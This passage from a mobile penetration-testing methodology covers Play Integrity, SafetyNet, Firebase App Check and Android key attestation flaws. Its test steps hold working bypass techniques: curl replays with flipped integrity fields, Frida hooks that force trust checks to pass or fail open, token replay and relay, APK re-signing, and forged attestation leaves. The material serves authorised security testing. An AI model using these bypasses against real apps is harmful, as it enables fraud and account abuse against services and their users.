diff /tmp/baseline /tmp/stripped ; wc -c /tmp/baseline /tmp/stripped
# identify WHAT changed. a correlation id or timestamp differing is not a finding.

# 2. LAYER ORDERING - a validation error does NOT prove you passed the integrity gate
curl -s -X POST https://api.target/v1/transfer -d '{'                       # malformed
# 400 "Invalid input"  <- this is the body parser, not the integrity middleware
curl -s -X POST https://api.target/v1/transfer -H 'Content-Type: application/json' -d '{}'
# 401/403 "integrity token required"  <- NOW you know where the gate sits

# 3. SERVER POLICY vs STATE - a 200 both with and without the header means the path
#    was never gated. a 403 -> 200 flip is meaningful; a constant 200 is not.
```
  For any claim about a missing per-device or per-account limit that the RASP was supposed to enforce, use
  n >= 10 interleaved trials per group in randomised order and require the suspect group's mean to sit at
  least 2 sigma from the control's — a single outlier is jitter. And count your results explicitly: shell
  array loops fail silently, so `wc -l` the output file rather than trusting the loop ran.
- **Proof:** The byte-level diff, the two-request layer-ordering pair, and the with/without control — all
  three in the report. The **state change on the server** (the transfer appearing in the ledger, the
  entitlement visible on a fresh GET) is the proof; the 200 is not.
- **Escalation:** A confirmed differential -> D21-013/-015/-016 at High. A byte-identical 200 -> the
  endpoint was never integrity-gated, which is a different (and usually smaller) finding: it belongs to
  D15 as an authorisation question, not here.
- **Ruled out when:** The stripped and baseline bodies are byte-identical, or the well-formed `{}` request
  returns the integrity-required error while only the malformed one returned a parser error. Write the
  retraction into the appendix with the disproving evidence rather than silently dropping it.

### D21-013 · The server makes a security decision on a client-asserted integrity boolean

| | |
|---|---|
| **Severity ceiling** | Critical when the gated action moves money or grants an entitlement; High otherwise |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 — any client can make the claim; no root is needed to send the request |
| **Applies to** | any app that sends a device-state field to its backend |
| **Maps to** | MASWE-0051 (CWE-1326), MASWE-0054, MASVS-RESILIENCE-1; Play Integrity overview's explicit "Do NOT" list ("Trust verdicts on client-side only", "Cache verdicts", "Make binary Allow/Deny decisions", "Rely solely on Play Integrity API") |

- **Test:** This is the payable form of root detection, and it has nothing to do with the detection. Find
  every request where the client sends a boolean or a score describing its own integrity, and flip it.
- **How:**
```bash
grep -rnE 'isRooted|rootBeer|RootBeer|SafetyNet|IntegrityManager|requestIntegrityToken|StandardIntegrityManager|isEmulator|isDebuggerConnected|deviceTrusted|deviceSafe|tampered' sources/
```
  Then, in the proxy, one field at a time:
```
# original, from a rooted device
POST /v1/session  {"deviceIntegrity":"FAILED","rooted":true}     -> 403
# tampered
POST /v1/session  {"deviceIntegrity":"OK","rooted":false}        -> 200 + session token
```
  Replay the accepted request **outside the app** so the client is provably not in the loop:
```bash
curl -i -X POST https://api.target/v1/session -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d '{"deviceIntegrity":"OK","rooted":false}'
```
- **Proof:** The HTTP status/body delta: same account, same device, one field changed, and the server
  issues a session or completes the gated action. Confirm the server-side effect with a separate GET —
  the ledger entry, the entitlement, the issued token — not the 200. Run D21-012 first.
- **Escalation:** -> D15 (the whole backend authz surface is now reachable from a client that lies),
  D23 (fraud/entitlement abuse at scale), D13 (if the flag gates step-up authentication).
- **Ruled out when:** No integrity-shaped field appears in any request body or header (D21-006 returned
  "opaque token" or "nothing"), **or** flipping the field changes nothing in the response body and the
  server-side state is unchanged on a follow-up read. A field the server ignores is not a control; say so
  and move to the token items.

### D21-014 · The integrity verdict is decoded and branched on inside the app

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 (the consequence); AM-12 for the mechanism |
| **Applies to** | all Play Integrity integrations |
| **Maps to** | MASTG-KNOW-0035, MASWE-0054, MASWE-0056; Play Integrity documentation: token decryption/verification belongs on Google's servers or the app's server, never in the app |

- **Test:** Play Integrity tokens can be decrypted on Google's servers or on the app's server. Decrypting
  **in the app** puts the decision on the attacker's device, and makes the whole integration hookable in
  one line.
- **How:**
```bash
grep -rn 'decodeIntegrityToken\|IntegrityTokenResponse\|standardIntegrityToken\|token()' sources/ -A6
# look for a LOCAL JSON parse of verdict fields rather than an opaque forward
grep -rn 'deviceRecognitionVerdict\|MEETS_DEVICE_INTEGRITY\|appRecognitionVerdict\|PLAY_RECOGNIZED\|appLicensingVerdict' sources/ -B4 -A6
```
  Then hook the comparison and watch the wire:
```javascript
Java.perform(function () {
  var G = Java.use('com.target.integrity.IntegrityGate');
  G.isDeviceTrusted.implementation = function () { console.log('[gate] forced true'); return true; };
});
```
- **Proof:** A local branch on the decoded verdict contents, hooked, followed by the backend accepting the
  subsequent request — i.e. the server never saw the token. Capture the request that should have been
  rejected.
- **Escalation:** -> D15. It converts a server-side control into a client-side one, which is the
  difference between a control and a speed bump.
- **Ruled out when:** The opaque token appears verbatim in an outbound request and the app contains no
  reference to `decodeIntegrityToken` or to any verdict string constant. Decoding on the backend is the
  documented baseline; record it as correct behaviour.

### D21-015 · Classic request with no server-generated nonce — one captured token, replayed forever

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | apps using Play Integrity **classic** requests |
| **Maps to** | MASTG-KNOW-0035 ("Include a NONCE with integrity verification requests"); Play Integrity documentation — the nonce "is used to protect against certain types of attacks, such as replay and tampering attacks"; MASWE-0054 |

- **Test:** The reportable bug is not that a verdict can be spoofed on a rooted device — it is the
  **integration**. A backend that accepts any structurally valid token without matching the nonce it
  issued is replayable, and the attack needs no device bypass at all.
- **How:**
```bash
grep -rn 'setNonce(\|requestIntegrityToken\|IntegrityTokenRequest' sources/ -B6 -A10
```
  Capture one valid token from a clean, stock device, then replay it from an instrumented one:
```
(a) same token, DIFFERENT action        -> does the server accept?
(b) same token, same action, +30 min    -> is there a freshness window?
(c) same token, DIFFERENT account       -> is the verdict bound to the caller?
(d) nonce replaced with a client-chosen value -> does the server compare it to what it issued?
```
- **Proof:** The backend returning 200 for the replayed token string against a request it never issued a
  nonce for. Same token, different request — that is the finding, and it survives any amount of
  client-side hardening.
- **Escalation:** -> D15 / D23. It defeats the attestation control for the whole user base, not for one
  rooted device — which is the severity argument to lead with.
- **Ruled out when:** Replaying a token against a second action, a second account or a later timestamp
  returns the same rejection as sending no token at all. Document the four replay cases and their
  responses; a correctly-bound classic integration is a positive observation worth stating.

### D21-016 · `requestHash` not bound to the request body — token relay from a clean device

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | apps using Play Integrity **standard** requests |
| **Maps to** | Play Integrity documentation — `requestHash` is "a digest of all relevant values from your app's request"; standard requests carry Google-managed replay mitigation but the backend must still validate `requestHash` against the protected action |

- **Test:** Standard requests have Google-side replay mitigation, so testers assume binding is handled.
  It is not: if the app puts a constant, a timestamp or a user id in `requestHash` instead of a digest of
  the request, an attacker gets a valid token on a clean device and relays it beside a modified request
  from an instrumented one.
- **How:**
```bash
grep -rn 'setRequestHash(' sources/ -B6 -A6
```
  Capture two requests with **different bodies** and compare the `requestHash` they carry:
```
body A {"amount":1,"to":"self"}    requestHash = 9f3c...    \
body B {"amount":9999,"to":"attacker"}  requestHash = 9f3c... > identical => binding absent
```
  Then perform the relay: token from device A (stock, clean), body from device B (rooted, hooked).
- **Proof:** The server accepting device A's token with device B's request body. This is a full integrity
  bypass with no reverse engineering of the integrity SDK at all.
- **Escalation:** -> D15 / D23. Recommend the fix explicitly: the digest must cover every security-relevant
  value in the request, and the backend must recompute and compare it.
- **Ruled out when:** `requestHash` changes when any field of the request body changes, and a relayed
  token paired with a modified body is rejected. Show the two differing hashes in the ruled-out entry.

### D21-017 · Freshness not enforced — `timestampMillis` ignored, or verdicts cached

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all Play Integrity integrations |
| **Maps to** | Play Integrity documented server check on `timestampMillis`; the overview's "No caching: Request verdicts on-demand to prevent replay/proxying attacks" and the "Do NOT cache verdicts (replay attack risk)" list entry |

- **Test:** Even a correctly-nonce-bound integration fails if the backend never checks how old the token
  is, or if the client caches a verdict and re-presents it. The documented server-side check is explicit:
```kotlin
if (!requestPackageName.equals(expectedPackageName)
    || !requestHash.equals(expectedRequestHash)
    || currentTimestampMillis - timestampMillis > ALLOWED_WINDOW_MILLIS) { /* invalid */ }
```
- **How:** Capture a valid token, then replay it at increasing delays and look for the boundary.
```bash
for d in 60 300 900 3600 86400; do
  sleep_until=$d
  echo "== replay after ${d}s"
  curl -s -o /tmp/r -w '%{http_code}\n' -X POST https://api.target/v1/transfer \
    -H "Authorization: Bearer $TOK" -H "X-Integrity-Token: $CAPTURED" \
    -H 'Content-Type: application/json' -d @body.json
done
```
  Client-side caching shows up as the *same* token string on consecutive launches:
```bash
grep -rn 'integrityToken\|verdict' sources/ | grep -i 'cache\|shared_?pref\|putString\|getString'
```
- **Proof:** A token accepted well outside any plausible window (the 24h case is the unambiguous one), or
  the identical token string observed on two launches hours apart.
- **Escalation:** -> D15/D23; and where the cached verdict is persisted to disk, -> D11 (the cached value
  is then also attacker-writable, see D21-035).
- **Ruled out when:** Replay past a bounded window returns the integrity-failure response, and each launch
  produces a distinct token. Record the observed window length — it is a useful number for the client.

### D21-018 · Verdict tier collapse — `MEETS_BASIC_INTEGRITY` or `MEETS_VIRTUAL_INTEGRITY` accepted as "passed"

| | |
|---|---|
| **Severity ceiling** | High for fraud-relevant flows |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 (an emulator farm is a remote client) |
| **Applies to** | all apps using Play Integrity |
| **Maps to** | Play Integrity verdicts documentation: `MEETS_DEVICE_INTEGRITY` = "Genuine certified Android device with hardware-backed proof of locked bootloader and certified OS (Android 13+)"; `MEETS_BASIC_INTEGRITY` = "bootloader can be locked/unlocked (less strict)"; `MEETS_VIRTUAL_INTEGRITY` = "Android-powered emulator with Google Play services"; MASTG-KNOW-0035 |

- **Test:** These labels are not equivalent and the backend's tier logic frequently collapses them into a
  single "passed" boolean. `MEETS_BASIC_INTEGRITY` explicitly permits an unlocked bootloader;
  `MEETS_VIRTUAL_INTEGRITY` **is** an emulator. A policy of "device integrity required" that accepts
  either is defeated.
- **How:** Run the same high-value flow on three device states and compare which actions succeed:
```
1. stock, locked, Play-certified physical device   -> expect MEETS_DEVICE_INTEGRITY (and STRONG on 13+)
2. bootloader-unlocked physical device             -> expect MEETS_BASIC_INTEGRITY at best
3. emulator with Google Play services              -> expect MEETS_VIRTUAL_INTEGRITY
```
  Carry the policy note for the report: on **Android 13+**, `MEETS_STRONG_INTEGRITY` requires device
  integrity **plus** recent security patches on all partitions (OS and vendor); on **Android 12 and
  lower** it mainly means hardware-backed boot integrity — a materially weaker signal than teams assume.
- **Proof:** The high-value action completing on case 2 or case 3, alongside the app's or the vendor's
  stated policy that the flow is device-integrity-only.
- **Escalation:** -> D23 automated abuse at scale (emulator farms, referral and promo fraud, scripted
  account creation). Tie the severity to the abuse economics, not to the label.
- **Ruled out when:** Cases 2 and 3 are both refused at the same point in the flow while case 1 succeeds,
  and the refusal comes from the server (verified by replaying the request outside the app). That is
  correct tiered enforcement — Allow / Allow with limits / CAPTCHA / Deny.

### D21-019 · App-identity fields in the verdict never checked — `appRecognitionVerdict`, `appLicensingVerdict`, `requestPackageName`

| | |
|---|---|
| **Severity ceiling** | High where it lets a repackaged client reach a gated flow; Medium otherwise |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all apps using Play Integrity |
| **Maps to** | Play Integrity verdicts: `appIntegrity.appRecognitionVerdict` (`PLAY_RECOGNIZED`, `UNRECOGNIZED_VERSION`, `UNEVALUATED`), `accountDetails.appLicensingVerdict` (`LICENSED`, `UNLICENSED`, `UNEVALUATED`); the documented caveat that `requestPackageName` can be spoofed mid-request and must not be the only app-identity check; MASTG-KNOW-0035 |

- **Test:** A backend that checks only `deviceIntegrity` accepts a token from a **modified** build of the
  app on a perfectly genuine device — which is the exact case a repackaging attacker occupies.
- **How:** Server-side review where you have it; empirically, install a re-signed build and drive the
  gated flow:
```bash
apktool d base.apk -o work && apktool b work -o modified.apk
java -jar uber-apk-signer.jar --apks modified.apk
adb install -r modified-aligned-debugSigned.apk
# then run the gated flow and read the verdict the backend acted on
```
  A re-signed build should yield `appRecognitionVerdict = UNRECOGNIZED_VERSION`; `UNEVALUATED` appears
  when the app was not installed from Play at all.
- **Proof:** The gated action completing from a re-signed, non-Play-installed build, proving the backend
  read the device fields and ignored the app fields.
- **Escalation:** -> D02 (repackaging acceptance), D17 (a modified client distributed through a poisoned
  channel), D23.
- **Ruled out when:** The re-signed build is refused at the server with an app-integrity error, or the
  server-side code demonstrably compares `requestPackageName` **and** the signing-certificate digest
  against independently configured values. Note that `requestPackageName` alone is insufficient by
  documentation.

### D21-020 · The integrity error branch fails open

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 (anyone can induce the error condition) |
| **Applies to** | all apps using Play Integrity |
| **Maps to** | MASTG-KNOW-0035 — local errors `APP_NOT_INSTALLED`, `APP_UID_MISMATCH`, default quota 10,000 requests/day; MASWE-0054 |

- **Test:** The API has documented local error conditions and a daily quota. An app whose failure listener
  logs and continues has a control that opens under load, on quota exhaustion, or on demand.
- **How:**
```bash
grep -rn 'addOnFailureListener\|onFailure\|IntegrityServiceException\|catch' sources/ -A8 \
  | grep -iE 'integrity|attest' -B4
```
  Induce the failure and watch the app:
```javascript
Java.perform(function () {
  var M = Java.use('com.google.android.play.core.integrity.IntegrityManager');
  // force the request path into its failure branch and observe the app's decision
  M.requestIntegrityToken.implementation = function (r) { throw Java.use('java.lang.RuntimeException').$new('x'); };
});
```
  Offline is the cheapest inducer of all: put the device in flight mode for the token request only.
- **Proof:** The failure branch reached (logcat or the Frida log) with the app proceeding to the protected
  flow, and the backend accepting the resulting request.
- **Escalation:** -> D15/D23. Note the availability angle: at 10,000 requests/day default quota, a
  high-traffic app can exhaust it, so fail-open is not a theoretical branch.
- **Ruled out when:** The app blocks the protected flow when the integrity request fails, and the server
  independently refuses a request carrying no token. Both halves are needed — a client that blocks but a
  server that accepts is D21-013.

### D21-021 · SafetyNet Attestation still shipped — the gate has been unconditionally open since January 2025

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | **LEGACY** — any app still shipping the SafetyNet Attestation dependency; still common in older enterprise and white-label builds |
| **Maps to** | Android SafetyNet deprecation timeline (deprecated 2022; full turndown January 2025; "the attest API returns a task that always invokes the on failure listener with an `ApiException`", status code 7 `NETWORK_ERROR`); MASWE-0054 |

- **Test:** SafetyNet Attestation was fully turned down. The `attest` API now *always* invokes the failure
  listener. An app still calling it, and treating that failure as "network problem, allow", has had a
  permanently open integrity gate in production for over a year.
- **How:**
```bash
unzip -l base.apk | grep -i safetynet
grep -rn 'SafetyNet\|SafetyNetClient\|attest(' sources/ -A8 | grep -in 'addOnFailureListener\|catch\|allow\|proceed'
grep -rn 'jwsResult' sources/
```
  Then confirm on device:
```javascript
Java.perform(function () {
  var T = Java.use('com.google.android.gms.tasks.Task');
  // log every failure listener invocation on the attest path, then watch the app continue
});
```
- **Proof:** The failure branch reached on every launch — with status code 7 in the log — and the app
  proceeding as if attested; plus the backend accepting the resulting request.
- **Escalation:** -> D15/D23. Frame it as "the anti-fraud control has not functioned for any user since
  January 2025", which is a far stronger sentence than "SafetyNet is deprecated". A SafetyNet-based
  Firebase App Check provider is the same defect in another place -> D21-025.
- **Ruled out when:** No SafetyNet classes or strings are present in the APK (the app migrated to Play
  Integrity), **or** the failure branch demonstrably blocks the protected flow. Where both SafetyNet and
  Play Integrity are present, test the Play Integrity path and note the dead dependency as hygiene.

### D21-022 · PII placed in `nonce` or `requestHash`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (**VARIES**) |
| **Attacker** | AM-09 / third-party processor exposure rather than a direct attacker |
| **Applies to** | all apps using Play Integrity |
| **Maps to** | Play Integrity documentation: data used for `requestHash` and `nonce` "is visible in cleartext to your app, and to Google. You should encrypt or hash the data before passing it to the Play Integrity API." |

- **Test:** Apps routinely stuff a user id, an email address or a session token straight into the nonce.
  The documentation warns against it explicitly, and it is a disclosure to a third party outside the
  declared data flow.
- **How:**
```bash
grep -rn 'setNonce(\|setRequestHash(' sources/ -B6
```
  Decode what you see on the wire (it is usually base64, sometimes base64url without padding):
```bash
echo "$NONCE" | tr '_-' '/+' | base64 -d 2>/dev/null | strings | head
```
- **Proof:** A decoded nonce containing an email address, a phone number, an account id or a bearer token,
  shown beside the app's own privacy policy / Data Safety declaration.
- **Escalation:** -> D20 (data-safety mismatch), and -> D13 if the value decoded is a live session token,
  in which case it is no longer a privacy item.
- **Ruled out when:** The nonce decodes to opaque random bytes or a digest, or fails to decode as text at
  all. Show the decode attempt output — "it looked random" is not evidence.

### D21-023 · `appAccessRiskVerdict` / `playProtectVerdict` requested but never enforced

| | |
|---|---|
| **Severity ceiling** | High on money-moving screens; Medium otherwise |
| **VRT** | `mobile_security_misconfiguration\|tapjacking` (P5) for the overlay half alone; argue up under `broken_access_control\|privilege_escalation` (**VARIES**) where the verdict was purchased to gate a transfer |
| **Attacker** | AM-04 (a local app holding one common permission — overlay or accessibility) |
| **Applies to** | apps with the `environmentDetails` opt-ins enabled; supported form factors only |
| **Maps to** | Play Integrity verdicts: `environmentDetails.appAccessRiskVerdict.appsDetected` (`KNOWN_INSTALLED`/`UNKNOWN_INSTALLED`, `KNOWN_CAPTURING`/`UNKNOWN_CAPTURING`, `KNOWN_CONTROLLING`/`UNKNOWN_CONTROLLING`, `KNOWN_OVERLAYS`/`UNKNOWN_OVERLAYS`), `playProtectVerdict` (`NO_ISSUES`, `NO_DATA`, `POSSIBLE_RISK`, `MEDIUM_RISK`, `HIGH_RISK`, `UNEVALUATED`); MASWE-0039, MASWE-0040 |

- **Test:** These opt-in verdicts exist precisely to detect screen-capturing, overlaying and
  device-controlling apps. Teams enable them in the Play Console, log them, and never gate on them. The
  control is then inert against the exact attack it was bought for.
- **How:**
```bash
grep -rn 'appAccessRiskVerdict\|playProtectVerdict\|environmentDetails' sources/   # often server-side only
adb shell settings get secure enabled_accessibility_services
adb shell dumpsys window windows | grep -iE 'TYPE_APPLICATION_OVERLAY|TYPE_ACCESSIBILITY'
adb shell appops get com.attacker SYSTEM_ALERT_WINDOW
grep -rnE 'canDrawOverlays|FLAG_WINDOW_IS_OBSCURED|FLAG_WINDOW_IS_PARTIALLY_OBSCURED|setFilterTouchesWhenObscured|accessibilityDataSensitive|FLAG_SECURE' sources/ res/layout/
```
  Run the money-moving flow with a capturing/overlay app and a test accessibility service active, and see
  whether the app applies any additional friction.
- **Proof:** A screen recording of the transfer confirmation completing unchanged while a capturing app
  and an enabled accessibility service are both present, with the app applying no step-up and the backend
  applying no additional check.
- **Escalation:** -> D04 UI redress, -> D13 credential capture, -> D23 remote-access-scam fraud. Note
  `android:accessibilityDataSensitive` is the Android 16+ control for the accessibility half, implicitly
  enabled by `android:filterTouchesWhenObscured="true"`.
- **Ruled out when:** The app refuses or steps up the sensitive action while an overlay or an untrusted
  accessibility service is present, or `environmentDetails` is not enabled for the integration at all (in
  which case there is no purchased control to report as inert — file the overlay gap under D04 instead).

### D21-024 · `deviceRecall` / `recentDeviceActivity` in use — a reset-resistant identifier

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (**VARIES**) |
| **Attacker** | n/a (privacy/compliance, not an attacker model) |
| **Applies to** | apps with the opt-in enabled |
| **Maps to** | Play Integrity overview: "Device Recall: Store custom data per-device on Google servers; survives app reinstall and device reset"; `recentDeviceActivity` |

- **Test:** `deviceRecall` lets a developer store custom per-device data on Google's servers that
  **survives app reinstall and factory reset**. That is a reset-resistant device identifier by design, and
  it is exactly the class of identifier privacy regimes treat most strictly. If the app uses it, confirm
  it is disclosed.
- **How:**
```bash
grep -rn -i 'deviceRecall\|device_recall\|recentDeviceActivity' sources/
```
  Then compare against the app's Play Data Safety section and privacy policy.
- **Proof:** The API in use with no corresponding disclosure — the code reference beside the policy text
  that omits it.
- **Escalation:** -> D20 (data-safety declaration mismatch is the filing home for this).
- **Ruled out when:** The API is absent, or the privacy policy and Data Safety section both disclose a
  persistent device identifier that survives reset. Quote the disclosing sentence in the ruled-out entry.

### D21-025 · Firebase App Check absent, monitoring-only, or shipping the debug provider

| | |
|---|---|
| **Severity ceiling** | High (a shipped debug provider/token is High on its own; Medium where App Check is simply absent) |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**); the data it exposes may rate higher under `sensitive_data_exposure\|disclosure_of_secrets\|*` |
| **Attacker** | AM-01 |
| **Applies to** | apps using Firebase/GCP-backed services or the App Check custom-backend integration |
| **Maps to** | Firebase App Check documentation — Play Integrity is the Android provider; protects Cloud Firestore, Realtime Database, Cloud Storage, callable Cloud Functions, Firebase Authentication (Preview) and custom backends; debug providers are local-development-only |

- **Test:** App Check is the control that makes "only our app may call this backend" true. Without it,
  every Firestore/RTDB/Storage/Callable finding is reachable from `curl`. This is the attestation item
  most often missed, because it lives in a different team's console.
- **How:**
```bash
grep -rnE 'FirebaseAppCheck|installAppCheckProviderFactory|PlayIntegrityAppCheckProviderFactory|DebugAppCheckProviderFactory|SafetyNetAppCheckProviderFactory|firebase_app_check_debug_token' \
  jadx_out/sources jadx_out/resources
# is enforcement actually on?  call the backend with a valid ID token and NO App Check header
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$PROJ/databases/(default)/documents:runQuery" \
  -H "Authorization: Bearer $ID_TOKEN" -H 'Content-Type: application/json' -d '{"structuredQuery":{}}' -i
```
- **Proof:** A 200 with document data from a plain `curl` carrying no `X-Firebase-AppCheck` header, plus
  the absence of `installAppCheckProviderFactory` in the decompiled source. If a debug provider or a
  debug token resource is present in the **release** APK, show the class reference and the shipped token —
  that is a permanent enforcement bypass.
- **Escalation:** -> D18 (it is the missing-mitigation line in every Firebase rules finding, and it turns
  an "on-device only" argument into a remote one). A `SafetyNetAppCheckProviderFactory` is also D21-021.
- **Ruled out when:** `installAppCheckProviderFactory` with the Play Integrity provider is present, no
  debug provider or debug token ships in the release build, and the unauthenticated-App-Check `curl`
  returns 401/403. Run D21-012's body diff on that response before believing it.

### D21-026 · Hardware key attestation checked on the device, or a boolean sent instead of the chain

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**); `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**) where the chain is accepted unverified |
| **Attacker** | AM-01 |
| **Applies to** | Android 7.0+ (Keymaster 2 key attestation) |
| **Maps to** | MASTG-KNOW-0044 (Key Attestation), MASTG-KNOW-0034 (Device Binding), MASWE-0054; Android security-key-attestation documentation — "Perform verification on a **separate server**, not on the device itself"; extension OID `1.3.6.1.4.1.11129.2.1.17` |

- **Test:** Attestation checked on the device is worthless: a compromised OS controls the checker. The
  DER-encoded certificate chain must reach the server, and the server must verify it against Google's
  attestation root.
- **How:**
```bash
grep -rnE 'setAttestationChallenge\(|getCertificateChain\(' sources/
grep -rn '1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' sources/          # the KeyDescription extension OID
grep -rn 'android.googleapis.com/attestation' sources/         # root/status endpoints referenced client-side
```
  Then intercept the enrolment or step-up request and read what it carries.
```
GOOD  {"attestationChain":["MIIC...","MIIB...","MIIB..."]}   # DER chain, server verifies
BAD   {"hardwareBacked":true,"securityLevel":"TrustedEnvironment"}   # a client assertion
```
  Flip the boolean in the bad case and replay.
- **Proof:** A Burp capture showing the client sending a boolean rather than the chain, and the server
  accepting the flipped value; or a chain sent but the app itself containing the verification logic
  (a client-side reference to `android.googleapis.com/attestation/root` is the tell).
- **Escalation:** -> D12 (the key-binding claim the app makes for local data is false),
  -> D13 (device-bound step-up auth is not device-bound), -> D15.
- **Ruled out when:** The full DER chain crosses the wire on every attestation-gated action and no
  verification code exists in the client. Then move to D21-027 to -D21-031, which test what the *server*
  does with it.

### D21-027 · Attestation extension parsed from the leaf instead of the first occurrence nearest the root

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**, argue Critical); `broken_authentication_and_session_management\|authentication_bypass` (**P1**) where the attestation is the authentication for device enrolment |
| **Attacker** | AM-01 |
| **Applies to** | all servers consuming Android key attestation |
| **Maps to** | Android security-key-attestation documentation — "**Critical**: Only trust the **first occurrence** of the extension (nearest to root). Extensions in the leaf certificate may have been added by attackers"; `KeyDescription` ASN.1 shape in AOSP keystore attestation docs |

- **Test:** If the server verifies the chain but reads `KeyDescription` from the **leaf**, an attacker who
  can mint a leaf injects arbitrary claims — `securityLevel`, `verifiedBootState`, `deviceLocked` — while
  every signature still validates.
- **How:** Server-side code review where available. Empirically, append an attacker-generated leaf carrying
  a forged `KeyDescription` to an otherwise genuine chain and submit it.
```bash
# inspect which certificate in the captured chain actually carries the extension
for i in 0 1 2 3; do
  echo "== cert $i"; openssl x509 -in chain_$i.pem -text -noout | grep -c '1.3.6.1.4.1.11129.2.1.17'
done
openssl x509 -in chain_0.pem -text -noout | grep -A40 '1.3.6.1.4.1.11129.2.1.17'
```
- **Proof:** The server accepting an attestation whose `securityLevel` or `verifiedBootState` came from an
  attacker-controlled certificate — demonstrated by a value in the accepted response that could only have
  come from the forged leaf.
- **Escalation:** -> full impersonation of a genuine locked device to the backend, and therefore every
  device-bound control downstream (D12, D13, D23).
- **Ruled out when:** A chain with an added leaf is rejected, or server-side review shows the parser walks
  to the occurrence nearest the root. Also confirm the server checks every certificate in the chain
  against the revocation list at `https://android.googleapis.com/attestation/status` — pre-2021 expired
  factory keys remain trustworthy unless revoked, so expiry alone is not the check.

### D21-028 · `attestationChallenge` not bound to a fresh server nonce — the chain replays

| | |
|---|---|
| **Severity ceiling** | Critical where attestation gates enrolment or payment provisioning; High otherwise |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) for the enrolment case; otherwise `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | Android security-key-attestation verification checklist — "`attestationChallenge` matches your nonce"; `KeyDescription.attestationChallenge` in AOSP keystore attestation docs; MASTG-KNOW-0034 |

- **Test:** `setAttestationChallenge()` must carry a fresh, server-issued, single-use value. A constant, a
  client-generated UUID or a timestamp means one genuine attestation replays forever — including from an
  emulator or from a completely different device.
- **How:**
```bash
grep -rn -B4 -A4 'setAttestationChallenge(' sources/     # is the argument a constant / UUID / timestamp?
```
  Capture two enrolments and diff the challenge, then replay the first chain for a third enrolment:
```bash
diff <(openssl x509 -in enrol1_leaf.pem -text -noout | grep -A5 'attestationChallenge') \
     <(openssl x509 -in enrol2_leaf.pem -text -noout | grep -A5 'attestationChallenge')
```
- **Proof:** Two enrolment requests carrying an identical `attestationChallenge`, plus a third enrolment
  succeeding after replaying a previously captured chain from a different device.
- **Escalation:** -> provisioning the app on an unauthorised or emulated device at scale (D23), and
  -> D13 where the enrolled device becomes an authentication factor.
- **Ruled out when:** The challenge differs on every enrolment **and** a replayed chain is refused. Show
  both challenges and the refusal.

### D21-029 · `RootOfTrust` present in the attestation and ignored by the backend

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | Android 7.0+ for the fields; Android 10+ for the VBMeta digest |
| **Maps to** | AOSP keystore attestation — `RootOfTrust` contains `verifiedBootKey`, `deviceLocked`, `verifiedBootState` (`Verified`, `SelfSigned`, `Unverified`, `Failed`), `verifiedBootHash`; AOSP security-model paper §4.7 (the state "can be verified by apps as well as passed onto backend services to remotely verify boot integrity"; from Android 10 with AVB2 the VBMeta struct digest is included "to support firmware transparency") |

- **Test:** A verified attestation *carries* the boot state. The common defect is a backend that validates
  the chain correctly and then never reads `deviceLocked` or `verifiedBootState` — an unlocked bootloader
  is exactly the case the app should treat differently and the one it silently accepts.
- **How:**
```bash
openssl x509 -in leaf.pem -text -noout | grep -A40 '1.3.6.1.4.1.11129.2.1.17'
adb shell getprop ro.boot.verifiedbootstate     # green / yellow / orange on the device under test
adb shell getprop ro.boot.flash.locked
```
  Run the gated flow from a bootloader-unlocked device (`deviceLocked=false`,
  `verifiedBootState=Unverified` or `SelfSigned`) and compare against the locked device.
- **Proof:** An attestation from a bootloader-unlocked device being accepted for a high-value action,
  alongside the decoded extension showing `deviceLocked=false`.
- **Escalation:** -> running every privileged flow on a fully attacker-controlled device (all of D11/D12),
  and -> D23 where the flow moves money.
- **Ruled out when:** The unlocked device is refused at the same point the locked one succeeds, and the
  refusal is server-side (replay the request with curl to confirm the client is not the gate). Record the
  decoded `RootOfTrust` block from both devices.

### D21-030 · `attestationSecurityLevel` and revocation not checked — a Software root is accepted

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all servers consuming Android key attestation |
